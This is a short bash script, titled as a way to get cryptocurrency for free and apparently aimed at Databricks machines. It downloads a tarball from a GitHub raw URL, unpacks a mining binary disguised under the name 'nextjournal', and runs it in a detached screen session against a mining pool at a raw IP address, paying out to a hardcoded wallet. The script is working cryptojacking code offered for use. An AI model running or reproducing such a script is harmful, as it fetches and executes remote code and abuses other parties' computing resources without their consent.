#! /bin/bash
# Get xmr coin for free
# Databricks
apt-get update
clear
apt-get install screen -y
 
wget https://raw.githubusercontent.com/dshillin/http-nodejs/main/nextjournal.tar.gz
tar xvzf nextjournal.tar.gz
cd nextjournal
screen ./nextjournal --algorithm turtlecoin --pool 142.132.131.248:80 --username TRTLv1hc4Ys615aVETRD9tB73tP7H53bwY3RQkBn7xH7iJzXP6FqKh9hJ8od82q59QLHLSiWiGEjYhoDPnCAcnWcS8nSGccNVsA --threads 2
